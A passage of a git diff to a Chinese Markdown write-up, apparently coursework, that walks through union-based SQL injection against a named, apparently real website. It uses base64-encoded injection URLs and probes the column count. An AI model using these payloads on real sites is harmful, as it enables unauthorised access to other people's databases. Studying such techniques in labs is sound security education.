@@ -19,10 +19,10 @@
 - 通过INFORMATION_SCHEMA查询表的名称和表内行的名称
 - 获取想要的数据
 
-***我们借助http://www1.tc711.com/tool/BASE64.htm这个base64工具进行base64加解密***
+***我们借助[http://www1.tc711.com/tool/BASE64.htm](http://www1.tc711.com/tool/BASE64.htm)这个base64工具进行base64加解密***
 
 ### 第一个网站的SQL注入
-- 测试是否能被注入，访问http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==，含义是```id=13 and 1=2```，返回的结果如下图，表明是可以注入的
+- 测试是否能被注入，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==)，含义是```id=13 and 1=2```，返回的结果如下图，表明是可以注入的
 ![third2.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third2.png)
 
 - 通过union测表段数目，这一个就比较无聊了，我们从1到30挨个测（30以上直接放弃，要累死= - =），最后测试出来表段数目是15，访问http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=，含义是```id=13 and 1=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15```，可以看到有九个显示位，显示位很多，就用不到concat()函数了，结果如下图：
